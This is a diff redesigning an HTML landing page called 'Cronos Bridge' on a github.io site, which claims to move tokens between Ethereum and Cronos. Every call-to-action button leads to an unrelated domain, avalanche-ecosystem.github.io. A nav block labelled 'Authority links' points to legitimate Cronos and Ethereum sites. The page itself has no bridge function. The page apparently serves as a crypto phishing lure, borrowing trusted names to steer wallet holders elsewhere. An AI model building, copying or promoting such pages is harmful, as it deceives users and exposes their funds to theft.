@@ -3,11 +3,11 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Cronos Bridge</title>
+  <title>Cronos Bridge &mdash; Bridge Assets to Cronos</title>
   <meta name="description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
   <link rel="canonical" href="https://cronos-bridge.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F8FA">
+  <meta name="theme-color" content="#071225">
   <meta property="og:type" content="website">
   <meta property="og:title" content="Cronos Bridge">
   <meta property="og:description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
@@ -28,6 +28,7 @@
         "@id": "https://cronos-bridge.github.io/#website",
         "url": "https://cronos-bridge.github.io/",
         "name": "Cronos Bridge",
+        "description": "Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.",
         "inLanguage": "en"
       },
       {
@@ -57,60 +58,97 @@
       <img src="favicon.png" width="28" height="28" alt="">
       <span>Cronos Bridge</span>
     </a>
+    <span class="spacer"></span>
     <nav class="nav" aria-label="Authority links">
       <a href="https://cronoscan.com/" target="_blank" rel="nofollow noopener noreferrer">Cronoscan</a>
       <a href="https://cronos.org/" target="_blank" rel="nofollow noopener noreferrer">Cronos</a>
       <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
     </nav>
-    <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
-    <section class="hero" aria-labelledby="page-title">
-      <h1 id="page-title">Cronos Bridge</h1>
-      <p class="sub"><strong>Cronos Bridge</strong> moves tokens between Ethereum and the Cronos chain from your own wallet.</p>
-    </section>
-
-    <section class="card" aria-label="Bridge route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img class="icon" src="eth.png" width="30" height="30" alt="Ethereum">
-            <span class="asset">Ethereum</span>
-          </span>
+  <main class="page-shell">
+    <section class="command-deck" aria-labelledby="page-title">
+      <div class="copy-panel">
+        <h1 id="page-title">Cronos Bridge</h1>
+        <p class="deck">Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.</p>
+        <h2>Bridge assets to Cronos with Cronos Bridge</h2>
+        <div class="chips" aria-label="Product qualities">
+          <span>Bridge to Cronos</span>
+          <span>Cross-chain assets</span>
+          <span>Non-custodial</span>
         </div>
-        <button class="switch" type="button" data-switch aria-label="Switch direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img class="icon" src="cro.png" width="30" height="30" alt="Cronos">
-            <span class="asset">Cronos</span>
-          </span>
-        </div>
+        <a class="cta cta-hero" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
       </div>
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+
+      <aside class="preview-card" aria-label="Cronos Bridge route preview">
+        <div class="window-bar">
+          <span class="selector-pill">Route preview</span>
+          <span class="preview-pill">Preview</span>
+        </div>
+        <div class="route-shell">
+          <div class="route-panel" data-route-panel="from">
+            <span class="panel-label">From chain</span>
+            <div class="asset-row">
+              <img src="eth.png" width="30" height="30" alt="Ethereum">
+              <div>
+                <strong>Ethereum</strong>
+                <span>Asset origin</span>
+              </div>
+            </div>
+          </div>
+          <button class="switch" type="button" data-switch aria-label="Switch route direction">
+            <span aria-hidden="true">&#8644;</span>
+          </button>
+          <div class="route-panel" data-route-panel="to">
+            <span class="panel-label">To</span>
+            <div class="asset-row">
+              <img src="cro.png" width="30" height="30" alt="Cronos">
+              <div>
+                <strong>Cronos</strong>
+                <span>Destination chain</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="best-route" aria-label="Best route">
+          <span>Best route</span>
+          <i aria-hidden="true"></i>
+          <i aria-hidden="true"></i>
+          <i aria-hidden="true"></i>
+        </div>
+        <a class="cta cta-card" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Start Bridge</a>
+      </aside>
     </section>
   </main>
 
-  <footer class="foot">Cronos Bridge &mdash; 2026</footer>
+  <div class="texture-band" aria-hidden="true">
+    <span><img src="eth.png" width="24" height="24" alt=""></span>
+    <span></span>
+    <span><img src="cro.png" width="24" height="24" alt=""></span>
+    <span></span>
+    <span><img src="favicon.png" width="24" height="24" alt=""></span>
+  </div>
+
+  <footer class="footer">
+    <span>Cronos Bridge &mdash; 2026</span>
+    
+  </footer>
 
   <script>
   (function () {
     "use strict";
+
     var button = document.querySelector("[data-switch]");
-    if (!button) return;
+    var fromPanel = document.querySelector('[data-route-panel="from"] .asset-row');
+    var toPanel = document.querySelector('[data-route-panel="to"] .asset-row');
+
+    if (!button || !fromPanel || !toPanel) return;
 
     button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".leg .chip");
-      if (chips.length < 2) return;
-
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
+      var from = fromPanel.innerHTML;
+      fromPanel.innerHTML = toPanel.innerHTML;
+      toPanel.innerHTML = from;
+      button.classList.toggle("is-swapped");
     });
   }());
   </script>
